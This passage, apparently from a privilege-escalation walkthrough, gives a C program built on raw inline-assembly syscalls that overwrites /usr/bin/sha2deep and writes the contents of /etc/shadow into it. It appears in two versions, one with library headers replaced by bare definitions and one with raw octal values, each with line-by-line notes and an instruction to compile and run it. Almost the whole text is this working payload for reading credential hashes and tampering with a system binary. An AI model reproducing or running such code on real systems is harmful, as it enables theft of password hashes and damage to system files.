## III. C wrapper with syscalls
Here I wanted to remove library headers and replace with syscalls and exact definitions that are needed

```c
#define STDOUT_FILENO 1
#define O_WRONLY  01
#define O_CREAT   0100
#define O_TRUNC   01000
#define S_IRUSR   0400
#define S_IWUSR   0200

static inline long syscall3(long num, long a1, long a2, long a3)
{
    long ret;
    __asm__ __volatile__(
        "syscall"
        : "=a"(ret)
        : "a"(num), "D"(a1), "S"(a2), "d"(a3)
        : "rcx", "r11", "memory"
    );
    return ret;
}

int main(void) {
long fd = syscall3(2, (long)"/usr/bin/sha2deep", 
                        O_WRONLY | O_CREAT | O_TRUNC, 
                        S_IRUSR | S_IWUSR);

    if (fd < 0) return 1;
    syscall3(33, fd, STDOUT_FILENO, 0);
    syscall3(3, fd, 0, 0);
    char *args[] = {"/bin/cat", "/etc/shadow", 0};
    syscall3(59, (long)"/bin/cat", (long)args, 0);
    return 0;
}
```
### Still run through steps II.2 - II.5 to compile and run
#### Notes

```c
#define STDOUT_FILENO 1
#define O_WRONLY  01
#define O_CREAT   0100
#define O_TRUNC   01000
#define S_IRUSR   0400
#define S_IWUSR   0200
```
Definitions to replace library headers

```c
static inline long syscall3(long num, long a1, long a2, long a3)
{
    long ret;
    __asm__ __volatile__(
        "syscall"
        : "=a"(ret)
        : "a"(num), "D"(a1), "S"(a2), "d"(a3)
        : "rcx", "r11", "memory"
    );
    return ret;
}
```
Custom assembly helper syscall with 3 args to make syscalls trigger properly with Linux kernel as standard C functions would

```c
    long fd = syscall3(2, (long)"/usr/bin/sha2deep", 
                        O_WRONLY | O_CREAT | O_TRUNC, 
                        S_IRUSR | S_IWUSR);

    if (fd < 0) return 1;
```
Syscall #2 for open  
Expects x64 long values for the file path, flags, and mode    
Manual error check for negative returns from kernel

```c
    syscall3(33, fd, STDOUT_FILENO, 0);
```
Syscall #33 for dup2


```c
    syscall3(3, fd, 0, 0);
```
Syscall #3 for close

```c
    char *args[] = {"/bin/cat", "/etc/shadow", 0};
    syscall3(59, (long)"/bin/cat", (long)args, 0);

    return 0;
}
```
Syscall #59 for execve  
Standard end NULL no longer needed since kernel is reading 0 arg directly

## IV. C wrapper without definitions

```c
static inline long syscall3(long num, long a1, long a2, long a3)
{
    long ret;
    __asm__ __volatile__(
        "syscall"
        : "=a"(ret)
        : "a"(num), "D"(a1), "S"(a2), "d"(a3)
        : "rcx", "r11", "memory"
    );
    return ret;
}

int main(void) {
    long fd = syscall3(2, (long)"/usr/bin/sha2deep", 01101, 0600);

    if (fd < 0) return 1;
    syscall3(33, fd, 1, 0);
    syscall3(3, fd, 0, 0);
    char *args[] = {"/bin/cat", "/etc/shadow", 0};
    syscall3(59, (long)"/bin/cat", (long)args, 0);
    
    return 0;
}
```

### Still run through steps II.2 - II.5 to compile and run

#### Notes

```c
    long fd = syscall3(2, (long)"/usr/bin/sha2deep", 01101, 0600);
```
Replaced Syscall #2's standard human-readable bitwise macros with raw octal values. 
O_WRONLY | O_CREAT | O_TRUNC = 01101
S_IRUSR | S_IWUSR = 0600

```c
    syscall3(33, fd, 1, 0);
```
Syscall #33's STDOUT_FILENO = 1

